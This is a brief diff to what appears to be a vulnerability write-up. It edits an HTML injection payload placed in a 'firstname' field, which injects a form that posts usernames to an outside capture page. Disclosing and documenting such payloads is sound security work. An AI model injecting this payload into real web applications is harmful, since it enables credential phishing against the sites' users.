@@ -307,8 +307,8 @@ Payload:
 
 - firstname: 
 ```
-<form action=”http://www.mysite.it/capture_page.php”>
-  Username: <input name=”user” type=”text”/><br/>
+  Username: <form action=”http://www.mysite.it/capture_page.php”>
+<input name=”user” type=”text”/><br/>
 ```
 - lastname:
 ```
